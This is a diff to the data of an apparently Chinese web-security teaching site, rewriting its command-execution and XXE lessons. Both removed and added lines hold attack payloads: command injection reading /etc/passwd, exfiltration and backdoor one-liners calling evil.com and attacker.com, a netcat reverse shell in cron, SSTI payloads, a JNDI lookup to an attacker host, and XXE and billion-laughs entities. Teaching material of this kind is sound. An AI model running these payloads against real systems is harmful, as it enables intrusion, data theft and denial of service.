@@ -355,46 +355,35 @@ const knowledgeData = {
     description: '命令执行漏洞允许攻击者在目标服务器上执行操作系统命令或代码，这可能导致完全控制系统、数据泄露或服务破坏。这类漏洞通常出现在将用户输入传递给系统命令的应用程序中。',
     sections: [
       {
-        title: '命令注入基础',
-        content: '命令注入发生在应用程序使用用户提供的输入作为系统命令的一部分，但没有适当过滤特殊字符时。攻击者可以通过插入命令分隔符（如;, |, &&, ||）来执行额外的系统命令。',
+        title: 'PHP命令执行',
+        content: 'PHP命令执行漏洞发生在应用程序使用用户输入作为系统命令参数但未正确过滤时。攻击者可以通过插入特殊字符和命令分隔符执行任意PHP代码或系统命令。',
         examples: [
-          "ping 127.0.0.1; ls -la",
-          "ping 127.0.0.1 | cat /etc/passwd",
-          "ping 127.0.0.1 && whoami",
-          "ping 127.0.0.1 || rm -rf /important"
+          "system()函数: system('ping ' . $_GET['host']);",
+          "执行运算符: echo `ping $_GET['host']`;",
+          "shell_exec()函数: $output = shell_exec('ls ' . $_GET['dir']);",
+          "eval()函数: eval('echo ' . $_POST['code'] . ';');"
         ],
         difficulty: 'beginner'
       },
       {
-        title: '绕过字符串过滤限制',
-        content: '为防止命令注入，应用程序可能会过滤或转义特定字符。攻击者可以使用各种技术来绕过这些限制，包括替代命令、特殊字符和编码。',
+        title: 'Java命令执行',
+        content: 'Java命令执行漏洞允许攻击者在Java应用程序中执行任意代码或系统命令。这通常通过不安全的反序列化、JNDI注入或对运行时环境的不安全访问实现。',
         examples: [
-          "使用反引号代替管道: ping `cat /etc/passwd`",
-          "使用$()替代反引号: ping $(cat /etc/passwd)",
-          "使用连接符避开空格过滤: cat\\${IFS}/etc/passwd",
-          "多级编码: $(echo '63 61 74 20 2f 65 74 63 2f 70 61 73 73 77 64' | xxd -p -r)"
+          "Runtime执行: Runtime.getRuntime().exec(\"ping \" + userInput);",
+          "ProcessBuilder: new ProcessBuilder(\"sh\", \"-c\", \"ping \" + userInput).start();",
+          "不安全的JNDI查找: context.lookup(\"ldap://attacker.com/exploit\");",
+          "不安全的反序列化: ObjectInputStream ois = new ObjectInputStream(input); Object obj = ois.readObject();"
         ],
         difficulty: 'intermediate'
       },
       {
-        title: '无回显的命令执行',
-        content: '在某些情况下，命令执行的结果不会直接显示在响应中。攻击者可以使用"盲注"技术，通过观察应用程序的行为或使用外部通信通道来确认命令是否执行以及获取输出。',
+        title: 'Python模板注入',
+        content: 'Python模板注入（SSTI）是一种通过操作模板引擎的语法实现代码执行的漏洞。当用户输入被直接插入到模板中而不进行适当的净化时，攻击者可以注入并执行Python代码。',
         examples: [
-          "使用时间延迟: ping 127.0.0.1 && sleep 5",
-          "使用DNS外带数据: ping `whoami`.attacker.com",
-          "使用Web请求外带: curl -d \"data=$(whoami)\" https://attacker.com/collect",
-          "创建文件: ping 127.0.0.1 && ls -la > /var/www/html/output.txt"
-        ],
-        difficulty: 'advanced'
-      },
-      {
-        title: '利用命令/代码执行漏洞写木马',
-        content: '一旦确认命令执行漏洞，攻击者可能会尝试上传和执行恶意程序（木马），以建立持久访问或获得更高权限。这通常涉及创建或下载可执行文件或脚本，并配置系统以运行它们。',
-        examples: [
-          "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/backdoor.php",
-          "curl https://evil.com/backdoor.sh | bash",
-          "wget -O /tmp/backdoor https://evil.com/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor",
-          "echo 'nc -e /bin/sh attacker.com 4444' > /etc/cron.d/backdoor"
+          "Flask/Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+          "Django: {% debug %} 或 {% include request.GET.template_name %}",
+          "Mako: <%import os>${os.popen('id').read()}",
+          "Tornado: {% import os %}{{os.popen('id').read()}}"
         ],
         difficulty: 'advanced'
       },
@@ -520,15 +509,6 @@ const knowledgeData = {
     description: 'XML外部实体注入(XXE)是一种针对处理XML输入的应用程序的攻击，通过利用XML解析器处理外部实体引用的特性，可能导致敏感数据泄露、服务器端请求伪造、服务器探测或拒绝服务。',
     sections: [
       {
-        title: 'XXE基础知识',
-        content: 'XML外部实体(XXE)攻击利用XML处理器解析用户提供的XML时对外部实体的处理。XML文档可以定义实体（变量），包括从外部源加载内容的外部实体。攻击者可以利用此功能访问系统文件、执行SSRF攻击或发起DoS攻击。',
-        examples: [
-          "基本XXE攻击:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
-          "使用DTD文件:\n<!DOCTYPE test SYSTEM \"http://evil.com/evil.dtd\">\n<root>Test</root>\n\n# evil.dtd内容:\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
-        ],
-        difficulty: 'beginner'
-      },
-      {
         title: '有回显的XXE',
         content: '有回显的XXE是指攻击者能够在应用程序响应中直接看到所检索文件的内容。这是最直接的XXE攻击形式，因为攻击结果立即可见。',
         examples: [
@@ -547,26 +527,6 @@ const knowledgeData = {
           "利用错误消息:\n<!DOCTYPE test [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % eval \"<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>\">\n  %eval;\n  %error;\n]>\n<root>Test</root>"
         ],
         difficulty: 'advanced'
-      },
-      {
-        title: 'XXE进阶技术',
-        content: '高级XXE技术用于绕过安全措施、提取二进制数据或执行更复杂的操作。这些技术通常涉及复杂的实体构造、参数实体和自定义错误处理。',
-        examples: [
-          "使用参数实体绕过过滤:\n<!DOCTYPE test [\n  <!ENTITY % param1 \"file:\">\n  <!ENTITY % param2 \"///etc/passwd\">\n  <!ENTITY % combined \"%param1;%param2;\">\n  <!ENTITY % file SYSTEM \"%combined;\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n<root>Test</root>",
-          "使用PHP封装器进行Base64编码(用于二进制文件):\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
-          "XInclude技术(当无法控制完整XML文档时):\n<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include parse=\"text\" href=\"file:///etc/passwd\"/>\n</root>"
-        ],
-        difficulty: 'expert'
-      },
-      {
-        title: 'XXE拒绝服务攻击',
-        content: 'XXE可用于执行多种拒绝服务攻击，包括无限实体扩展(亿笑攻击)和外部资源枯竭。这些攻击可能导致服务器CPU或内存资源耗尽。',
-        examples: [
-          "亿笑攻击:\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n  <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n  <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n  <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n  <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz>",
-          "外部实体耗尽:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"file:///dev/random\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>",
-          "远程服务器耗尽:\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM \"http://delayserver.com/delay.php?time=60\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>"
-        ],
-        difficulty: 'expert'
       }
     ],
     protection: [
@@ -576,8 +536,7 @@ const knowledgeData = {
       '使用简单数据格式如JSON替代XML（如可能）',
       '实施数据输入的白名单验证',
       '使用XSD验证输入的XML文档',
-      '定期更新XML处理库到最新版本',
-      '使用Web应用防火墙配置规则检测XXE攻击特征'
+      '定期更新XML处理库到最新版本'
     ]
   },
   'logic-vulnerabilities': {
